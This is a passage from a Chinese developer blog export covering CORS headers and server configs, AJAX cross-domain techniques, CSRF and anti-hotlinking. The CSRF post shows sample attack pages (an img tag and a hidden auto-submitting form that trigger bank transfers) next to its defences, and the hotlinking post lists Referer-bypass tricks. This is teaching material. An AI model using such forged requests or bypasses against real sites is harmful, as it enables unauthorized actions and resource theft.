中可能不会将这些请求视为“简单请求”。 举例说明 下面是一段浏览器的JavaScript脚本。 12345 var url = 'http://api.alice.com/cors';var xhr = new XMLHttpRequest();xhr.open('PUT', url, true);xhr.setRequestHeader('X-Custom-Header', 'value');xhr.send(); 上面代码中，HTTP请求的方法是PUT，并且发送一个自定义头信息X-Custom-Header。 浏览器发现，这是一个非简单请求，就自动发出一个”预检”请求，要求服务器确认可以这样请求。下面是这个”预检”请求的HTTP头信息。 12345678 OPTIONS /cors HTTP/1.1Origin: http://api.bob.comAccess-Control-Request-Method: PUTAccess-Control-Request-Headers: X-Custom-HeaderHost: api.alice.comAccept-Language: en-USConnection: keep-aliveUser-Agent: Mozilla/5.0... “预检”请求用的请求方法是OPTIONS，表示这个请求是用来询问的。头信息里面，关键字段是Origin，表示请求来自哪个源。 除了Origin字段，”预检”请求的头信息包括两个特殊字段。 Access-Control-Request-Method该字段是必须的，用来列出浏览器的CORS请求会用到哪些HTTP方法，上例是PUT。 -（2）Access-Control-Request-Headers该字段是一个逗号分隔的字符串，指定浏览器CORS请求会额外发送的头信息字段，上例是X-Custom-Header。 预检请求的回应服务器收到”预检”请求以后，检查了Origin、Access-Control-Request-Method和Access-Control-Request-Headers字段以后，确认允许跨源请求，就可以做出回应。 123456789101112 HTTP/1.1 200 OKDate: Mon, 01 Dec 2008 01:15:39 GMTServer: Apache/2.0.61 (Unix)Access-Control-Allow-Origin: http://api.bob.comAccess-Control-Allow-Methods: GET, POST, PUTAccess-Control-Allow-Headers: X-Custom-HeaderContent-Type: text/html; charset=utf-8Content-Encoding: gzipContent-Length: 0Keep-Alive: timeout=2, max=100Connection: Keep-AliveContent-Type: text/plain 上面的HTTP回应中，关键的是Access-Control-Allow-Origin字段，表示http://api.bob.com可以请求数据。该字段也可以设为星号，表示同意任意跨源请求。 1 Access-Control-Allow-Origin: * 如果浏览器否定了”预检”请求，会返回一个正常的HTTP回应，但是没有任何CORS相关的头信息字段。这时，浏览器就会认定，服务器不同意预检请求，因此触发一个错误，被XMLHttpRequest对象的onerror回调函数捕获。控制台会打印出如下的报错信息。 12 XMLHttpRequest cannot load http://api.alice.com.Origin http://api.bob.com is not allowed by Access-Control-Allow-Origin. 服务器回应的其他CORS相关字段如下。 1234 Access-Control-Allow-Methods: GET, POST, PUTAccess-Control-Allow-Headers: X-Custom-HeaderAccess-Control-Allow-Credentials: trueAccess-Control-Max-Age: 1728000 （1）Access-Control-Allow-Methods该字段必需，它的值是逗号分隔的一个字符串，表明服务器支持的所有跨域请求的方法。注意，返回的是所有支持的方法，而不单是浏览器请求的那个方法。这是为了避免多次”预检”请求。 （2）Access-Control-Allow-Headers如果浏览器请求包括Access-Control-Request-Headers字段，则Access-Control-Allow-Headers字段是必需的。它也是一个逗号分隔的字符串，表明服务器支持的所有头信息字段，不限于浏览器在”预检”中请求的字段。 （3）Access-Control-Allow-Credentials该字段与简单请求时的含义相同。 （4）Access-Control-Max-Age该字段可选，用来指定本次预检请求的有效期，单位为秒。上面结果中，有效期是20天（1728000秒），即允许缓存该条回应1728000秒（即20天），在此期间，不用发出另一条预检请求。 预检请求成功之后浏览器进行正常的CORS请求，就都跟简单请求一样，会有一个Origin头信息字段。服务器的回应，也都会有一个Access-Control-Allow-Origin头信息字段。 完整实例 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859 &lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"&gt;&lt;html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"&gt;&lt;head&gt; &lt;title&gt;Simple use of Cross-Site XMLHttpRequest (Using Access Control)&lt;/title&gt; &lt;script type="text/javascript"&gt; var invocation = new XMLHttpRequest(); var url = 'http://aruner.net/resources/access-control-with-post-preflight/'; var invocationHistoryText; var body = '&lt;?xml version="1.0"?&gt;&lt;person&gt;&lt;name&gt;Arun&lt;/name&gt;&lt;/person&gt;'; function callOtherDomain() &#123; if(invocation) &#123; invocation.open('POST', url, true); invocation.setRequestHeader('X-PINGARUNER', 'pingpong'); invocation.setRequestHeader('Content-Type', 'application/xml'); invocation.onreadystatechange = handler; invocation.send(body); &#125; else &#123; invocationHistoryText = "No Invocation TookPlace At All"; var textNode = document.createTextNode(invocationHistoryText); var textDiv = document.getElementById("textDiv"); textDiv.appendChild(textNode); &#125; &#125; function handler(evtXHR) &#123; if (invocation.readyState == 4) &#123; if (invocation.status == 200) &#123; var response = invocation.responseText; //var invocationHistory = response.getElementsByTagName('invocationHistory').item(0).firstChild.data; invocationHistoryText = document.createTextNode(response); var textDiv = document.getElementById("textDiv"); textDiv.appendChild(invocationHistoryText); &#125; else &#123; alert("Invocation Errors Occured " + invocation.readyState + " and the status is " + invocation.status); &#125; &#125; else &#123; dump("currently the application is at" + invocation.readyState); &#125; &#125; &lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;form id="controlsToInvoke" action=""&gt; &lt;p&gt; &lt;input type="button" value="Click to Invoke Another Site" onclick="callOtherDomain()" /&gt; &lt;/p&gt; &lt;/form&gt; &lt;p id="intro"&gt; This page POSTs XML data to another domain using cross-site XMLHttpRequest mitigated by Access Control. This is the preflight scenario and the invocation to a resource on another domain takes place using first an OPTIONS request, then an actual POST request. &lt;/p&gt; &lt;div id="textDiv"&gt; This XHTML document POSTs to another resource using cross-site XHR. If you get a response back, the content of that response should reflect what you POSTed. &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 预检请求与重定向 大多数浏览器不支持针对于预检请求的重定向。如果一个预检请求发生了重定向，浏览器将报告错误： 123 The request was redirected to &apos;https://example.com/foo&apos;, which is disallowed for cross-origin requests that require preflightRequest requires preflight, which is disallowed to follow cross-origin redirect 在浏览器的实现跟上规范之前，有两种方式规避上述报错行为： 在服务端去掉对预检请求的重定向； 将实际请求变成一个简单请求。 如果上面两种方式难以做到，我们仍有其他办法： 发出一个简单请求（使用 Response.url 或 XHR.responseURL）以判断真正的预检请求会返回什么地址。 发出另一个请求（真正的请求），使用在上一步通过Response.url 或 XMLHttpRequest.responseURL获得的URL。 不过，如果请求是由于存在 Authorization 字段而引发了预检请求，则这一方法将无法使用。这种情况只能由服务端进行更改。 附带身份凭证的请求 一般而言，对于跨域 XMLHttpRequest 或 Fetch 请求，浏览器不会发送身份凭证信息。如果要发送凭证信息，需要设置 XMLHttpRequest的withCredentials 标志设置为 true，从而向服务器发送 Cookies。 1234567891011 var invocation = new XMLHttpRequest();var url = 'http://bar.other/resources/credentialed-content/'; function callOtherDomain()&#123; if(invocation) &#123; invocation.open('GET', url, true); invocation.withCredentials = true; invocation.onreadystatechange = handler; invocation.send(); &#125;&#125; 如果服务器端的响应中未携带 Access-Control-Allow-Credentials: true ，浏览器将不会把响应内容返回给请求的发送者。 对于附带身份凭证的请求，服务器不得设置 Access-Control-Allow-Origin 的值为“*”。 这是因为请求的首部中携带了 Cookie 信息，如果 Access-Control-Allow-Origin 的值为“*”，请求将会失败。而将 Access-Control-Allow-Origin 的值设置为 http://foo.example，则请求将成功执行。 另外，响应首部中也携带了 Set-Cookie 字段，尝试对 Cookie 进行修改。如果操作失败，将会抛出异常。 HTTP 响应首部字段 Access-Control-Allow-Origin响应首部中可以携带一个 Access-Control-Allow-Origin 字段，其语法如下: 1 Access-Control-Allow-Origin: &lt;origin&gt; | * 其中，origin 参数的值指定了允许访问该资源的外域 URI。对于不需要携带身份凭证的请求，服务器可以指定该字段的值为通配符，表示允许来自所有域的请求。 例如，下面的字段值将允许来自 http://mozilla.com 的请求： 1 Access-Control-Allow-Origin: http://mozilla.com 如果服务端指定了具体的域名而非“*”，那么响应首部中的 Vary 字段的值必须包含 Origin。这将告诉客户端：服务器对不同的源站返回不同的内容。 Access-Control-Expose-Headers在跨域访问时，XMLHttpRequest对象的getResponseHeader()方法只能拿到一些最基本的响应头，Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma，如果要访问其他头，则需要服务器设置本响应头。 Access-Control-Expose-Headers 头让服务器把允许浏览器访问的头放入白名单，例如： 1 Access-Control-Expose-Headers: X-My-Custom-Header, X-Another-Custom-Header 这样浏览器就能够通过getResponseHeader访问X-My-Custom-Header和 X-Another-Custom-Header 响应头了。 Access-Control-Max-AgeAccess-Control-Max-Age 头指定了preflight请求的结果能够被缓存多久，请参考本文在前面提到的preflight例子。 1 Access-Control-Max-Age: &lt;delta-seconds&gt; delta-seconds 参数表示preflight请求的结果在多少秒内有效。 Access-Control-Allow-CredentialsAccess-Control-Allow-Credentials 头指定了当浏览器的credentials设置为true时是否允许浏览器读取response的内容。当用在对preflight预检测请求的响应中时，它指定了实际的请求是否可以使用credentials。请注意：简单 GET 请求不会被预检；如果对此类请求的响应中不包含该字段，这个响应将被忽略掉，并且浏览器也不会将相应内容返回给网页。 1 Access-Control-Allow-Credentials: true Access-Control-Allow-MethodsAccess-Control-Allow-Methods 首部字段用于预检请求的响应。其指明了实际请求所允许使用的 HTTP 方法。 1 Access-Control-Allow-Methods: &lt;method&gt;[, &lt;method&gt;]* Access-Control-Allow-HeadersAccess-Control-Allow-Headers 首部字段用于预检请求的响应。其指明了实际请求中允许携带的首部字段。 1 Access-Control-Allow-Headers: &lt;field-name&gt;[, &lt;field-name&gt;]* HTTP 请求首部字段 列出了可用于发起跨域请求的首部字段。请注意，这些首部字段无须手动设置。 当开发者使用 XMLHttpRequest 对象发起跨域请求时，它们已经被设置就绪。 OriginOrigin 首部字段表明预检请求或实际请求的源站。 1 Origin: &lt;origin&gt; origin 参数的值为源站 URI。它不包含任何路径信息，只是服务器名称。 Note: 有时候将该字段的值设置为空字符串是有用的，例如，当源站是一个 data URL 时。注意，不管是否为跨域请求，ORIGIN 字段总是被发送。 Access-Control-Request-MethodAccess-Control-Request-Method 首部字段用于预检请求。其作用是，将实际请求所使用的 HTTP 方法告诉服务器。 1 Access-Control-Request-Method: &lt;method&gt; Access-Control-Request-HeadersAccess-Control-Request-Headers 首部字段用于预检请求。其作用是，将实际请求所携带的首部字段告诉服务器。 1 Access-Control-Request-Headers: &lt;field-name&gt;[, &lt;field-name&gt;]* IE 10 提供了对规范的完整支持，但在较早版本（8 和 9）中，CORS 机制是借由 XDomainRequest 对象完成的。Firefox 3.5 引入了对 XMLHttpRequests 和 Web 字体的跨域支持（但最初的实现并不完整，这在后续版本中得到完善）；Firefox 7 引入了对 WebGL 贴图的跨域支持；Firefox 9 引入了对 drawImage 的跨域支持。 服务端配置CORS 在服务端使用cors，因为服务端有很多种，所以这里只举例自己知道的Node、Nginx、Koa，如果有同学知道其他的方法，欢迎在评论里面添加。 Nginx 12345678910111213141516171819202122232425262728293031323334353637383940 server &#123; listen 80; server_name aaaaa.xxxx.me; location / &#123; if ($request_method = 'OPTIONS') &#123; add_header 'Access-Control-Allow-Origin' '*' ; add_header 'Access-Control-Allow-Credentials' 'false'; add_header 'Access-Control-Allow-Methods' 'GET, POST, OPTIONS'; add_header 'Access-Control-Allow-Headers' 'DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type'; add_header 'Access-Control-Max-Age' 1728000; add_header 'Content-Type' 'text/plain charset=UTF-8'; add_header 'Content-Length' 0; # 预检请求直接返回 return 204; &#125; if ($request_method = 'POST') &#123; add_header 'Access-Control-Allow-Origin' '*' ; add_header 'Access-Control-Allow-Credentials' 'false'; add_header 'Access-Control-Allow-Methods' 'GET, POST, OPTIONS'; add_header 'Access-Control-Allow-Headers' 'DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type'; &#125; if ($request_method = 'GET') &#123; add_header 'Access-Control-Allow-Origin' '*' ; add_header 'Access-Control-Allow-Credentials' 'false'; add_header 'Access-Control-Allow-Methods' 'GET, POST, OPTIONS'; add_header 'Access-Control-Allow-Headers' 'DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type'; &#125; proxy_connect_timeout 3; proxy_send_timeout 30; proxy_read_timeout 30; proxy_pass http://localhost:9716; proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header REMOTE-HOST $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125;&#125; 该示例不包含带有身份凭证请求的处理，如果需要可将Access-Control-Allow-Origin指定为特定协议+域名+端口的源，同时Access-Control-Allow-Credentials为true，这样会因为Access-Control-Allow-Origin一次只能配置一个源而无法配置多个源，可以使用map改善这个情况。 123456789 map $http_origin $corsHost &#123; default 0; "~http://www.haibakeji.com" http://www.haibakeji.com; "~http://m.haibakeji.com" http://m.haibakeji.com; "~http://wap.haibakeji.com" http://wap.haibakeji.com;&#125;......add_header Access-Control-Allow-Origin $corsHost;...... Node 定义一个中间件来添加响应标头，然后在处理app.get（或post等）之前使用 12345678910111213141516171819 //CORS middlewarevar allowCrossDomain = function(req, res, next) &#123; res.header('Access-Control-Allow-Origin', 'http://example.com'); res.header('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE'); res.header('Access-Control-Allow-Headers', 'Content-Type'); next();&#125;//...app.configure(function() &#123; app.use(express.bodyParser()); app.use(express.cookieParser()); app.use(express.session(&#123; secret: 'cool beans' &#125;)); app.use(express.methodOverride()); app.use(allowCrossDomain); app.use(app.router); app.use(express.static(__dirname + '/public'));&#125;); Koa koa框架肯定是可以解决的，但是有一个优秀的插件将为我们省不少力气。koa2-cors 1234567891011121314151617 var Koa = require('koa');var cors = require('koa2-cors'); var app = new Koa();app.use(cors(&#123; origin: function(ctx) &#123; if (ctx.url === '/test') &#123; return false; &#125; return '*'; &#125;, exposeHeaders: ['WWW-Authenticate', 'Server-Authorization'], maxAge: 5, credentials: true, allowMethods: ['GET', 'POST', 'DELETE'], allowHeaders: ['Content-Type', 'Authorization', 'Accept'],&#125;)); 这段代码只是一个小栗子，具体要查看文档了解详细内容 参考 Cross-Origin Resource Sharing (CORS)HTTP访问控制（CORS）(中) Fetch APIFetch API(中) Server-Side Access Control服务器端访问控制（CORS）(中) 跨域资源共享 CORS 详解 配置Nginx 允许多个域名跨域访问在Node.js上启用CORS]]></content>
      <categories>
        <category>HTTP</category>
      </categories>
      <tags>
        <tag>CORS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ajax 跨域]]></title>
    <url>%2Fblob%2F2019-04-09-ajax-cross-domain%2F</url>
    <content type="text"><![CDATA[前言 跨域作为前端开发者需要了解并且知道处理办法的一个知识点，也是一个老生常谈的一个话题，所以在这里整理并且给自己做一个记录。 关于跨域，有三种类型，本文只专注于ajax请求跨域(ajax跨域只是属于浏览器跨源网络访问中的一部分,其它的还有跨源脚本API访问、跨源数据存储访问)， 为什么会有跨域这个问题 这个问题先查看官方的解释浏览器的同源策略，对于官方文档有些人可能看的比较吃力，可以查看浏览器同源政策及其规避方法 解决方法 总结来看当前解决ajax跨域问题，主要有五种方法：可跨源的元素、JSONP、CORS、Nginx、WebSocket、 可跨域的元素 script、img、video、audio、embed、@font-face、frame、iframe 的 src link 的 href object 的 data applet 添加授权基本上常用的只有script和img，用来接口请求和打点 JSONP 该方式需要利用可跨域元素script的特性，一个是跨域一个是返回的js代码会在浏览器立即执行，利用这个特性实现的，同时需要服务端的配合。JSONP最大特点就是简单适用，老式浏览器全部支持，服务器改造非常小。 它的基本思想是，网页通过添加一个&lt;script\&gt;元素，向服务器请求JSON数据，这种做法不受同源政策限制；服务器收到请求后，将数据放在一个指定名字的回调函数里传回来。 JSONP的缺点是只能发送get请求 首先，网页动态插入&lt;script\&gt;元素，由它向跨源网址发出请求。 1234567891011121314 function addScriptTag(src) &#123; var script = document.createElement('script'); script.setAttribute("type","text/javascript"); script.src = src; document.body.appendChild(script);&#125;window.onload = function () &#123; addScriptTag('http://example.com/ip?callback=foo');&#125;function foo(data) &#123; console.log('Your public IP address is: ' + data.ip);&#125;; 上面代码通过动态添加&lt;script\&gt;元素，向服务器 example.com 发出请求。注意，该请求的查询字符串有一个callback参数，用来指定回调函数的名字，这对于JSONP是必需的。 服务器收到这个请求以后，会将数据放在回调函数的参数位置返回。 123 foo(&#123; "ip": "8.8.8.8"&#125;); 由于&lt;script\&gt;元素请求的脚本，直接作为代码运行。这时，只要浏览器定义了foo函数（该函数绑定在window下，否则会因为找不到该函数而报错），该函数就会立即调用。作为参数的JSON数据被视为JavaScript对象，而不是字符串，因此避免了使用JSON.parse的步骤。 CORS CORS是跨源资源分享（Cross-Origin Resource Sharing）的缩写。它是W3C标准，是跨源AJAX请求的根本解决方法。相比JSONP只能发GET请求，CORS允许任何类型的请求。 这个会单独讲如何通过CORS 完成跨源AJAX请求。 Nginx 该方法使用的是Nginx的反向代理，Nginx 反向代理的指令不需要新增额外的模块，默认自带 proxy_pass 指令，只需要修改配置文件就可以实现反向代理。 1234567891011 # xxxx项目location ~ ^/xxxx/ &#123; proxy_set_header X-Real-IP $remote_addr; proxy_set_header Host xxxx.com; #proxy_set_header Host $host; #proxy_set_header Host $host:8080; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_http_version 1.1; proxy_pass http://192.168.31.35; proxy_redirect off;&#125; 具体的配置项在nginx的文章中查看，这里不做介绍 WebSocket WebSocket是一种通信协议，使用ws://（非加密）和wss://（加密）作为协议前缀。该协议不实行同源政策，只要服务器支持，就可以通过它进行跨源通信。 Websocket是HTML5的一个持久化的协议，它实现了浏览器与服务器的全双工通信，同时也是跨域的一种解决方案。WebSocket和HTTP都是应用层协议，都基于 TCP 协议。但是 WebSocket 是一种双向通信协议，在建立连接之后，WebSocket 的 server 与 client 都能主动向对方发送或接收数据。同时，WebSocket 在建立连接时需要借助 HTTP 协议，连接建立好了之后 client 与 server 之间的双向通信就与 HTTP 无关了。 下面是一个例子，浏览器发出的WebSocket请求的头信息（摘自维基百科）。 12345678 GET /chat HTTP/1.1Host: server.example.comUpgrade: websocketConnection: UpgradeSec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==Sec-WebSocket-Protocol: chat, superchatSec-WebSocket-Version: 13Origin: http://example.com 上面代码中，有一个字段是Origin，表示该请求的请求源（origin），即发自哪个域名。 正是因为有了Origin这个字段，所以WebSocket才没有实行同源政策。因为服务器可以根据这个字段，判断是否许可本次通信。如果该域名在白名单内，服务器就会做出如下回应。 12345 HTTP/1.1 101 Switching ProtocolsUpgrade: websocketConnection: UpgradeSec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=Sec-WebSocket-Protocol: chat 原生WebSocket API使用起来不太方便，我们使用Socket.io，它很好地封装了webSocket接口，提供了更简单、灵活的接口，也对不支持webSocket的浏览器提供了向下兼容。 参考 ajax跨域，这应该是最全的解决方案了 不要再问我跨域的问题了 浏览器同源政策及其规避方法 跨域资源共享 CORS 详解 CSRF：http://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html 使用WebSocket进行跨域数据请求]]></content>
      <categories>
        <category>HTTP</category>
      </categories>
      <tags>
        <tag>跨域</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅谈CSRF]]></title>
    <url>%2Fblob%2F2019-04-08-on-csrf%2F</url>
    <content type="text"><![CDATA[什么是CSRF CSRF（Cross-site request forgery），中文名称：跨站请求伪造。攻击者盗用了你的身份，以你的名义发送恶意请求。 CSRF的原理 下图简单阐述了CSRF攻击的思想： 从上图可以看出，要完成一次CSRF攻击，受害者必须依次完成两个步骤： 登录受信任网站A，并在本地生成Cookie。 在不登出A的情况下，访问危险网站B。 上面大概地讲了一下CSRF攻击的思想，下面我将用几个例子详细说说具体的CSRF攻击，这里我以一个银行转账的操作作为例子（仅仅是例子，真实的银行网站没这么傻:&gt;） 示例1： 银行网站A，它以GET请求来完成银行转账的操作，如：http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000 危险网站B，它里面有一段HTML的代码如下： 1 &lt;img src=http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000&gt; 首先，你登录了银行网站A，然后访问危险网站B，噢，这时你会发现你的银行账户少了1000块…… 为什么会这样呢？原因是银行网站A违反了HTTP规范，使用GET请求更新资源。在访问危险网站B的之前，你已经登录了银行网站A，而B中的&lt;img\&gt;以GET的方式请求第三方资源（这里的第三方就是指银行网站了，原本这是一个合法的请求，但这里被不法分子利用了），所以你的浏览器会带上你的银行网站A的Cookie发出Get请求，去获取资源 http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000，结果银行网站服务器收到请求后，认为这是一个更新资源操作（转账操作），所以就立刻进行转账操作…… 示例2： 为了杜绝上面的问题，银行决定改用POST请求完成转账操作。银行网站A的WEB表单如下： 12345 &lt;form action="Transfer.php" method="POST"&gt; &lt;p&gt;ToBankId: &lt;input type="text" name="toBankId" /&gt;&lt;/p&gt; &lt;p&gt;Money: &lt;input type="text" name="money" /&gt;&lt;/p&gt; &lt;p&gt;&lt;input type="submit" value="Transfer" /&gt;&lt;/p&gt;&lt;/form&gt; 后台处理页面Transfer.php如下： 1234567 &lt;?php session_start(); if (isset($_REQUEST['toBankId'] &amp;&amp; isset($_REQUEST['money'])) &#123; buy_stocks($_REQUEST['toBankId'], $_REQUEST['money']); &#125;?&gt; 危险网站B，仍然只是包含那句HTML代码： 1 &lt;img src=http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000&gt; 和示例1中的操作一样，你首先登录了银行网站A，然后访问危险网站B，结果…..和示例1一样，你再次没了1000块～T_T，这次事故的原因是：银行后台使用了$_REQUEST去获取请求的数据，而$_REQUEST既可以获取GET请求的数据，也可以获取POST请求的数据，这就造成了在后台处理程序无法区分这到底是GET请求的数据还是POST请求的数据。在PHP中，可以使用$_GET和$_POST分别获取GET请求和POST请求的数据。在JAVA中，用于获取请求数据request一样存在不能区分GET请求数据和POST数据的问题。 示例3： 经过前面2个惨痛的教训，银行决定把获取请求数据的方法也改了，改用$_POST，只获取POST请求的数据，后台处理页面Transfer.php代码如下： 1234567 &lt;?php session_start(); if (isset($_POST['toBankId'] &amp;&amp; isset($_POST['money'])) &#123; buy_stocks($_POST['toBankId'], $_POST['money']); &#125;?&gt; 然而，危险网站B与时俱进，它改了一下代码： 12345678910111213141516171819 &lt;html&gt; &lt;head&gt; &lt;script type="text/javascript"&gt; function steal()&#123; iframe = document.frames["steal"]; iframe.document.Submit("transfer"); &#125; &lt;/script&gt; &lt;/head&gt; &lt;body onload="steal()"&gt; &lt;iframe name="steal" display="none"&gt; &lt;form method="POST" name="transfer" action="http://www.myBank.com/Transfer.php"&gt; &lt;input type="hidden" name="toBankId" value="11"&gt; &lt;input type="hidden" name="money" value="1000"&gt; &lt;/form&gt; &lt;/iframe&gt; &lt;/body&gt;&lt;/html&gt; 如果用户仍是继续上面的操作，很不幸，结果将会是再次不见1000块……因为这里危险网站B暗地里发送了POST请求到银行! 总结一下上面3个例子，CSRF主要的攻击模式基本上是以上的3种，其中以第1,2种最为严重，因为触发条件很简单，一个&lt;img\&gt;就可以了，而第3种比较麻烦，需要使用JavaScript，所以使用的机会会比前面的少很多，但无论是哪种情况，只要触发了CSRF攻击，后果都有可能很严重。 理解上面的3种攻击模式，其实可以看出，CSRF攻击是源于WEB的隐式身份验证机制！WEB的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的！ CSRF防御 尽量使用POST，限制GET GET接口太容易被拿来做CSRF攻击，看第一个示例就知道，只要构造一个img标签，而img标签又是不能过滤的数据。接口最好限制为POST使用，GET则无效，降低攻击风险。 当然POST并不是万无一失，攻击者只要构造一个form就可以，但需要在第三方页面做，这样就增加暴露的可能性。 浏览器Cookie策略 IE6、7、8、Safari会默认拦截第三方本地Cookie（Third-party Cookie）的发送。但是Firefox2、3、Opera、Chrome、Android等不会拦截，所以通过浏览器Cookie策略来防御CSRF攻击不靠谱，只能说是降低了风险。 PS：Cookie分为两种，会话期 Cookie（在浏览器关闭后，就会失效，保存到内存里），持久性 Cookie（即只有到了Exprie时间后才会失效的Cookie，这种Cookie会保存到本地）。 PS：另外如果网站返回HTTP头包含P3P Header，那么将允许浏览器发送第三方Cookie。 加验证码 验证码，强制用户必须与应用进行交互，才能完成最终请求。在通常情况下，验证码能很好遏制CSRF攻击。但是出于用户体验考虑，网站不能给所有的操作都加上验证码。因此验证码只能作为一种辅助手段，不能作为主要解决方案。 Referer Check Referer Check在Web最常见的应用就是“防止图片盗链”。同理，Referer Check也可以被用于检查请求是否来自合法的“源”（Referer值是否是指定页面，或者网站的域），如果都不是，那么就极可能是CSRF攻击。 但是因为服务器并不是什么时候都能取到Referer，所以也无法作为CSRF防御的主要手段。但是用Referer Check来监控CSRF攻击的发生，倒是一种可行的方法。 Anti CSRF Token 现在业界对CSRF的防御，一致的做法是使用一个Token（Anti CSRF Token）。 例子： 用户访问某个表单页面。 服务端生成一个Token，放在用户的Session中，或者浏览器的Cookie中。 在页面表单附带上Token参数。 用户提交请求后， 服务端验证表单中的Token是否与用户Session（或Cookies）中的Token一致，一致为合法请求，不是则非法请求。 这个Token的值必须是随机的，不可预测的。由于Token的存在，攻击者无法再构造一个带有合法Token的请求实施CSRF攻击。另外使用Token时应注意Token的保密性，尽量把敏感操作由GET改为POST，以form或AJAX形式提交，避免Token泄露。 注意： CSRF的Token仅仅用于对抗CSRF攻击。当网站同时存在XSS漏洞时候，那这个方案也是空谈。所以XSS带来的问题，应该使用XSS的防御方案予以解决。 参考 浅谈CSRF攻击方式Cross-Site Request Forgery (CSRF)站点安全 Web安全之CSRF攻击]]></content>
      <categories>
        <category>HTTP</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[防盗链]]></title>
    <url>%2Fblob%2F2019-04-08-anti-theft-chain%2F</url>
    <content type="text"><![CDATA[要了解什么是防盗链，那就得先说说什么是盗链。 盗链 盗链简单地可以理解成别人偷偷盗用了访问自己资源的链接。盗链比较常见的就是一些小网站盗用大的网站的资源（图片、视频、音乐等），将这些资源的地址直接放在自己的页面上，使得自己的用户可以自己通过自己的网站访问到并不在自己服务器上的内容。这样既可以向用户提供此内容，又可以将访问服务器的负担转移到别人的服务器上。 防盗链 简而言之，防盗链就是防止别人的盗链行为。让盗用自己资源的请求失效，从而减轻自己服务器的压力。 防盗链如何实现？ 防盗链的实现可以通过设置HTTP Header中的Referer实现。当浏览器向服务器发送请求的时候，请求头中包含了Referer用于告诉服务器这个请求是来自哪里的，服务器可以借助这个字段进行防盗处理。后台可以获取到请求中的referer，如果请求来源不是本站则进行阻止或返回其他页面。 如果Http头不包含referer，也就是通过浏览器地址栏直接访问该资源URL，服务器就返回页面。 如果盗用网站是 https 的 协议，而图片链接是 http 的话，则从 https 向 http 发起的请求会因为安全性的规定，而不带 referer，从而实现防盗链的绕过。 或者使用nginx的allow、denynginx访问控制allow、deny（ngx_http_access_module） https://www.cnblogs.com/wangyongsong/p/8204698.html 如何突破防盗链 如果盗用图片资源是 http协议那么盗用网址可以使用 https 去请求会因为安全性的规定，而不带 referer，从而实现防盗链的绕过。 referer为空 代码内请求伪造referer，或者服务端伪造请求头 在 HTML 代码的 head 中添加一句 &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt; &lt;img referrer=&quot;no-referrer|origin|unsafe-url&quot; src=&quot;{item.src}&quot;/&gt; https://images.weserv.nl/?url=${你的图片地址} 因为网址是国外的速度有点慢效果还行，目的就是返回一个不受限制的图片，但是 GIF 格式会返回jpg也就是没有了动画效果。 利用iframe伪造请求referer 12345 function showImg( url ) &#123; var frameid = 'frameimg' + Math.random(); window.img = '&lt;img id="img" src="'+url+'?'+Math.random()+'" /&gt;&lt;script&gt;window.onload = function() &#123; parent.document.getElementById("'+frameid+'").height = document.getElementById("img").height+"px"; &#125;&lt;/script&gt;'; document.write('&lt;iframe id="'+frameid+'" src="javascript:parent.img;" frameBorder="0" scrolling="no" width="100%"&gt;&lt;/iframe&gt;');&#125; 反破解 既然有破解就当然有常用的防御机制😄 不允许 referer为空（不建议，因在某些开启隐私模式的浏览器中，或 https 页面引用下， referer是空的） 地址变更（ lighttpd的是根据有效时间， nginx的根据是 md5，IP地址变化） 登录校验（如必须登录网站帐号后才能访问） 以下是防止网站被镜像，被 iframe 1. 防止网站被镜像（被恶意解析和转发等） 现象：他人域名访问到的是我的网站解析的 ip 地址我的 解决方法： http.ini里可以这样写 1 &quot;RewriteCond Host: !^www.web.cn$ RewriteRule (.*) http://www.web.cn$1 [I,RP]&quot; .htaccess里可以这样写 1 “RewriteCond %&#123;HTTP_HOST&#125; !^www.web.cn$ [NC] RewriteRule ^(.*)$ http://www.web.cn/$1 [L,R=301]” 代码的意思非常简单：访问这个网站的域名如果不是 “www.web.cn&quot; 就自动跳转到 “www.web.cn&quot; 上。这样设置就不怕自己辛辛苦苦维护的网站被别人镜像了。 2. 防止网址被 iframe 代码：在页面底部或其它公用部位加入如下代码 1 &lt;script type=”text/javascript&gt; if(window!=parent) window.top.location.href = window.location.href; &lt; /script&gt; 代码的意思也很简单，用js方法检测地址栏域名是不是当前网站绑定的域名，如果不是，则跳转到绑定的域名上来，这样就不怕网站被别人 iframe了。 参考 防盗链——防止其他页面通过url直接访问本站资源防盗链传说中图片防盗链的爱恨情仇]]></content>
      <categories>
        <category>HTTP</category>
      </categories>
      <tags>
        <tag>盗链</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浏览器的同源策略]]></title>
    <url>%2Fblob%2F2019-04-02-browser-homology-policy%2F</url>
